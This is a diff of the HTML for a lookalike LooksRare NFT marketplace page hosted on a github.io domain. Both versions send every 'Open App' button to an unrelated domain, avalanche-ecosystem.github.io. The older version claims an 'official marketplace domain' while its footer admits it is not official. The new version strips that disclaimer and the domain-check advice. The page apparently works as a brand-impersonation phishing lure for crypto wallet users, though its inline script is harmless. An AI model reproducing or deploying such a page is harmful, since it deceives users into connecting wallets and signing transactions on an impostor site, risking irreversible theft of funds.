@@ -1,47 +1,104 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>LooksRare - Open App</title><meta name="description" content="looksrare opens the official NFT marketplace to explore collections, buy, sell, make offers, and access rewards in the app.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://looksrare-site.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="LooksRare - Open App"><meta property="og:description" content="looksrare opens the official NFT marketplace to explore collections, buy, sell, make offers, and access rewards in the app.">
-<meta property="og:url" content="https://looksrare-site.github.io/"><meta property="og:image" content="https://looksrare-site.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="LooksRare - Open App"><meta name="twitter:description" content="looksrare opens the official NFT marketplace to explore collections, buy, sell, make offers, and access rewards in the app."><meta name="twitter:image" content="https://looksrare-site.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://looksrare-site.github.io/#website", "url": "https://looksrare-site.github.io/", "name": "LooksRare"}, {"@type": "WebPage", "@id": "https://looksrare-site.github.io/#webpage", "url": "https://looksrare-site.github.io/", "name": "LooksRare - Open App", "description": "looksrare opens the official NFT marketplace to explore collections, buy, sell, make offers, and access rewards in the app.", "inLanguage": "en", "isPartOf": {"@id": "https://looksrare-site.github.io/#website"}}, {"@type": "Organization", "@id": "https://looksrare-site.github.io/#org", "name": "LooksRare", "url": "https://looksrare-site.github.io/", "logo": "https://looksrare-site.github.io/og-cover.png", "sameAs": ["https://x.com/looksrare", "https://github.com/LooksRare", "https://www.coingecko.com/en/coins/looksrare", "https://defillama.com/protocol/looksrare"]}, {"@type": "WebApplication", "@id": "https://looksrare-site.github.io/#app", "name": "LooksRare", "url": "https://looksrare-site.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "looksrare opens the official NFT marketplace to explore collections, buy, sell, make offers, and access rewards in the app.", "featureList": ["Official marketplace domain", "WalletConnect support", "Audits listed in docs"], "isPartOf": {"@id": "https://looksrare-site.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://looksrare-site.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is LooksRare?", "acceptedAnswer": {"@type": "Answer", "text": "LooksRare is an NFT marketplace on Ethereum, and the Investopedia NFT explainer gives broader context for why these assets trade as unique token records. Users connect a wallet, browse collections, buy listed NFTs, make offers, sell items, and interact with order types such as collection offers where available. LOOKS is the ecosystem token, not the NFT being bought."}}, {"@type": "Question", "name": "What is LOOKS token used for?", "acceptedAnswer": {"@type": "Answer", "text": "LOOKS is the token associated with the LooksRare marketplace, and the CoinMarketCap LOOKS token page tracks token-level market context. It is separate from WETH, which is often used for NFT offers, and separate from the NFTs listed on the marketplace. Current token utility should be checked in official LooksRare pages because marketplace incentives have evolved."}}, {"@type": "Question", "name": "Why does LooksRare use WETH?", "acceptedAnswer": {"@type": "Answer", "text": "LooksRare can use WETH for bids and offers because WETH is a wrapped version of ETH; Binance Academy's WETH guide explains why wrapped ETH is useful in token approval flows. Native ETH is used for gas and can be used in some direct purchase flows, so the main user issue is managing approvals and keeping enough ETH for gas."}}, {"@type": "Question", "name": "Does LooksRare pay creator royalties?", "acceptedAnswer": {"@type": "Answer", "text": "LooksRare documentation emphasizes creator royalties at the moment of sale, but royalty handling can depend on current marketplace policy, collection settings, and order details. Academic research on the economics of NFT creator royalties explains why royalty design matters for creators and buyers. Sellers and buyers should inspect the live trade preview before signing because final proceeds can include marketplace fees, creator royalties, and gas."}}, {"@type": "Question", "name": "How do collection offers work on LooksRare?", "acceptedAnswer": {"@type": "Answer", "text": "A collection offer is a bid that can be accepted for any eligible NFT in a selected collection, rather than one specific token ID. The LooksRare aggregator overview describes marketplace routing for ERC721 and ERC1155 orders. Before signing, buyers should confirm the collection, currency, price, quantity, and expiration, and sellers should confirm that the accepted offer applies to the intended NFT."}}, {"@type": "Question", "name": "Is LooksRare only on Ethereum?", "acceptedAnswer": {"@type": "Answer", "text": "LooksRare is primarily associated with Ethereum NFT marketplace activity and the LOOKS token is an Ethereum ecosystem token; Wired's launch coverage frames that Ethereum-marketplace context. Users should treat the live app as the source of truth for current marketplace networks and supported collections."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="LooksRare"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">LooksRare</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>LooksRare</h1>
-      <div class="appcard"><div class="appcard-head"><img src="favicon.png" alt="" width="40" height="40"><b>LooksRare</b><span class="badge">NFT Market</span></div><div class="appcard-chips"><span><b>Category</b> NFT marketplace</span><span><b>Network</b> Ethereum</span><span><b>Token</b> LOOKS</span><span><b>Launched</b> 2022</span></div><a class="btn btn-dark" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open LooksRare App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open LooksRare ↗</a></div>
-      <p class="hero-note">Live preview — open the official LooksRare app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official marketplace domain</span><span class="trust-chip">WalletConnect support</span><span class="trust-chip">Audits listed in docs</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is LooksRare?</h2><div class="capsule"><strong>LooksRare</strong> is a community-first NFT marketplace for buying, selling, making offers on, and browsing digital collectibles. The marketplace category fits the broader <a class="inline-link" href="https://ethereum.org/nft/" rel="noopener noreferrer">ethereum.org overview of NFT ownership records</a>, while ERC-721 remains the common single-token standard for many collectibles described in the <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-721" rel="noopener noreferrer">ERC-721 non-fungible token specification</a>.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>LooksRare at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>NFT marketplace</b></div><div class="f"><small>Network</small><b>Ethereum</b></div><div class="f"><small>Token</small><b><a class="inline-link" href="https://www.coingecko.com/en/coins/looksrare" rel="noopener noreferrer">LOOKS token market profile</a></b></div><div class="f"><small>Launched</small><b>2022</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://etherscan.io/address/0x00000000005228B791a99a61f36A130d50600106" rel="noopener noreferrer">verified aggregator contract</a></b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>LooksRare NFT marketplace rewards</h2><div class="intent-a">LooksRare is an Ethereum NFT marketplace that launched with a strong rewards narrative for traders, collectors, creators, and LOOKS stakers, a launch context covered in <a class="inline-link" href="https://www.wired.com/story/opensea-nfts-twitter" rel="noopener noreferrer">Wired's marketplace launch analysis</a>. The exact reward programs have changed over time, so users should not assume that old LOOKS trading rewards, listing rewards, or staking returns still apply in the same way. For current searches, the right answer is to check the live LooksRare app and rewards page before trading. LOOKS is the marketplace token; NFTs are still bought and sold through wallet-signed marketplace orders, with protocol-level context available from <a class="inline-link" href="https://defillama.com/protocol/looksrare" rel="noopener noreferrer">DefiLlama's LooksRare fee and revenue page</a>.</div></div></section><section class="section"><div class="container"><h2>LOOKS token and LooksRare staking</h2><div class="intent-a">LOOKS is the token associated with the LooksRare marketplace ecosystem. It has been used for rewards and staking-related mechanisms, and the token is separate from NFTs listed on the marketplace and separate from WETH used to make many NFT bids. Because LOOKS economics have changed across product versions, token holders should verify current staking availability, reward source, lockup rules, and claim flow in official LooksRare pages. A token listing such as the <a class="inline-link" href="https://www.coingecko.com/en/coins/looksrare" rel="noopener noreferrer">CoinGecko LOOKS listing</a> is useful for contract, market, and supply context, but it does not replace the current app terms.</div></div></section><section class="section section-alt"><div class="container"><h2>LooksRare fees and creator royalties</h2><div class="intent-a">LooksRare fees and royalties are searched often because marketplace costs affect both buyers and sellers. The live app should be treated as the source of truth for current order costs. A sale can involve protocol fees, creator royalties, WETH approvals, and Ethereum gas, depending on the action; the <a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">ethereum.org gas and fees guide</a> explains the network-fee side of that checkout. Buyers should inspect the final amount before signing; sellers should inspect expected proceeds after fees and royalties. For historical articles, note that LooksRare fee and reward policies have changed, so current app data matters more than old launch-era posts.</div></div></section><section class="section"><div class="container"><h2>LooksRare collection offers and trait offers</h2><div class="intent-a">LooksRare supports marketplace order types that searchers often compare with OpenSea workflows, including fixed-price listings, NFT offers, collection offers, and trait offers where available. A collection offer targets any NFT in a collection, while a trait offer targets NFTs with a specific trait. The <a class="inline-link" href="https://docs.looksrare.org/developers/looksrare-aggregator-overview" rel="noopener noreferrer">LooksRare aggregator architecture notes</a> describe routing ERC721 and ERC1155 marketplace orders, and the <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-1155" rel="noopener noreferrer">ERC-1155 multi-token standard</a> explains the multi-asset token model. Before signing, users should check the collection, item criteria, currency, expiration, and total value because a broad offer can execute against any matching NFT.</div></div></section>
-  <section class="section"><div class="container"><h2>How to trade LooksRare</h2><ol class="steps"><li><b>Open the app</b><span>Go to the official domain and confirm looksrare.org before connecting a wallet.</span></li><li><b>Connect wallet</b><span>Use a supported wallet or WalletConnect, then review each signature request before approving; the <a class="inline-link" href="https://docs.walletconnect.network/wallet-sdk/overview" rel="noopener noreferrer">WalletConnect signing workflow overview</a> explains how apps request signatures.</span></li><li><b>Find a collection</b><span>Search collections, compare listings, offers, activity, and item details inside the marketplace.</span></li><li><b>Trade or manage</b><span>Buy listed NFTs, make offers, list owned NFTs, or open Rewards from the same app.</span></li></ol><div class="cta-band"><div><p>Ready to trade?</p><p class="sub">Open the official LooksRare app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open LooksRare ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>LooksRare vs OpenSea</h2><p class="intent-a">For marketplace comparisons, liquidity and order depth matter more than brand familiarity; NFT pricing research such as this <a class="inline-link" href="https://arxiv.org/abs/2310.01815" rel="noopener noreferrer">study of NFT price determinants</a> is a useful reminder to compare collection-specific signals before trading.</p><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>LooksRare</th><th>Alternative</th></tr></thead><tbody><tr><td>Core use</td><td>Ethereum NFT marketplace</td><td>Broad NFT marketplace</td></tr><tr><td>Token</td><td>LOOKS</td><td>No marketplace token for normal trades</td></tr><tr><td>Order types</td><td>Listings, item offers, collection and trait offers</td><td>Listings and marketplace-specific offer tools</td></tr><tr><td>Rewards focus</td><td>Historically central to marketplace identity</td><td>Less token-reward driven</td></tr><tr><td>Best check</td><td>Live bids, rewards, fees, royalties</td><td>Live listings, bids, fees, royalties</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Fees, custody, and security notes</h2><div class="facts"><div class="f"><small>Fees</small><b><a class="inline-link" href="https://defillama.com/protocol/looksrare" rel="noopener noreferrer">protocol fee context</a></b><span>Inspect fees and gas before signing; on-chain actions are irreversible and this is not financial advice.</span></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://etherscan.io/address/0x00000000005228B791a99a61f36A130d50600106" rel="noopener noreferrer">on-chain contract record</a></b><span>Review approvals and counterparties before signing; on-chain actions are irreversible and this is not financial advice.</span></div><div class="f"><small>Security</small><b><a class="inline-link" href="https://code4rena.com/reports/2022-11-looksrare" rel="noopener noreferrer">independent audit contest report</a></b><span>Audits reduce known risk but do not remove it; on-chain actions are irreversible and this is not financial advice.</span></div></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>LooksRare FAQ</h2><div class="faq-list"><details open><summary><h3>What is LooksRare?</h3></summary><div>LooksRare is an NFT marketplace on Ethereum, and the <a class="inline-link" href="https://www.investopedia.com/non-fungible-tokens-nft-5115211" rel="noopener noreferrer">Investopedia NFT explainer</a> gives broader context for why these assets trade as unique token records. Users connect a wallet, browse collections, buy listed NFTs, make offers, sell items, and interact with order types such as collection offers where available. LOOKS is the ecosystem token, not the NFT being bought.</div></details><details><summary><h3>What is LOOKS token used for?</h3></summary><div>LOOKS is the token associated with the LooksRare marketplace, and the <a class="inline-link" href="https://coinmarketcap.com/currencies/looksrare/" rel="noopener noreferrer">CoinMarketCap LOOKS token page</a> tracks token-level market context. It is separate from WETH, which is often used for NFT offers, and separate from the NFTs listed on the marketplace. Current token utility should be checked in official LooksRare pages because marketplace incentives have evolved.</div></details><details><summary><h3>Why does LooksRare use WETH?</h3></summary><div>LooksRare can use WETH for bids and offers because WETH is a wrapped version of ETH; <a class="inline-link" href="https://academy.binance.com/en/articles/what-is-wrapped-ether-weth-and-how-to-wrap-it" rel="noopener noreferrer">Binance Academy's WETH guide</a> explains why wrapped ETH is useful in token approval flows. Native ETH is used for gas and can be used in some direct purchase flows, so the main user issue is managing approvals and keeping enough ETH for gas.</div></details><details><summary><h3>Does LooksRare pay creator royalties?</h3></summary><div>LooksRare documentation emphasizes creator royalties at the moment of sale, but royalty handling can depend on current marketplace policy, collection settings, and order details. Academic research on <a class="inline-link" href="https://arxiv.org/abs/2212.00292" rel="noopener noreferrer">the economics of NFT creator royalties</a> explains why royalty design matters for creators and buyers. Sellers and buyers should inspect the live trade preview before signing because final proceeds can include marketplace fees, creator royalties, and gas.</div></details><details><summary><h3>How do collection offers work on LooksRare?</h3></summary><div>A collection offer is a bid that can be accepted for any eligible NFT in a selected collection, rather than one specific token ID. The <a class="inline-link" href="https://docs.looksrare.org/developers/looksrare-aggregator-overview" rel="noopener noreferrer">LooksRare aggregator overview</a> describes marketplace routing for ERC721 and ERC1155 orders. Before signing, buyers should confirm the collection, currency, price, quantity, and expiration, and sellers should confirm that the accepted offer applies to the intended NFT.</div></details><details><summary><h3>Is LooksRare only on Ethereum?</h3></summary><div>LooksRare is primarily associated with Ethereum NFT marketplace activity and the LOOKS token is an Ethereum ecosystem token; <a class="inline-link" href="https://www.wired.com/story/opensea-nfts-twitter" rel="noopener noreferrer">Wired's launch coverage</a> frames that Ethereum-marketplace context. Users should treat the live app as the source of truth for current marketplace networks and supported collections.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <p class="footer-note">Not the official LooksRare app; verify looksrare.org before connecting. Educational only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>LooksRare</title>
+  <meta name="description" content="LooksRare is an NFT marketplace where you buy and sell NFTs from your own wallet.">
+  <link rel="canonical" href="https://looksrare-site.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F8F6">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="LooksRare">
+  <meta property="og:description" content="LooksRare is an NFT marketplace where you buy and sell NFTs from your own wallet.">
+  <meta property="og:url" content="https://looksrare-site.github.io/">
+  <meta property="og:image" content="https://looksrare-site.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="LooksRare">
+  <meta name="twitter:description" content="LooksRare is an NFT marketplace where you buy and sell NFTs from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://looksrare-site.github.io/#website",
+        "url": "https://looksrare-site.github.io/",
+        "name": "LooksRare",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://looksrare-site.github.io/#app",
+        "name": "LooksRare",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://looksrare-site.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://looksrare-site.github.io/#organization",
+        "name": "LooksRare",
+        "url": "https://looksrare-site.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="LooksRare home">
+      <img src="favicon.png" width="28" height="28" alt="">
+      <span>LooksRare</span>
+    </a>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/token/0xf4d2888d29d722226fafa5d9b24f9164c092421e" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://www.coingecko.com/en/coins/looksrare" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+      <a href="https://ethereum.org/nft/" target="_blank" rel="nofollow noopener noreferrer">NFT guide</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">LooksRare</h1>
+      <p class="sub"><strong>LooksRare</strong> is an NFT marketplace where you buy and sell NFTs from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="NFT marketplace entry">
+      <div class="nft-tile" aria-hidden="true">
+        <div class="tile-grid"></div>
+        <img class="tile-badge" src="looks.png" width="34" height="34" alt="">
+      </div>
+      <div class="listing-row">
+        <span class="listing-label">List or buy NFTs</span>
+        <button class="mode-toggle" type="button" data-mode-toggle aria-label="Switch buy or sell mode">Buy</button>
+        <span class="eth-chip">
+          <img src="eth.png" width="22" height="22" alt="">
+          <span>ETH</span>
+        </span>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">LooksRare &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-mode-toggle]");
+    if (!button) return;
+    button.addEventListener("click", function () {
+      var next = button.textContent === "Buy" ? "Sell" : "Buy";
+      button.textContent = next;
+    });
+  }());
+  </script>
+</body>
+</html>
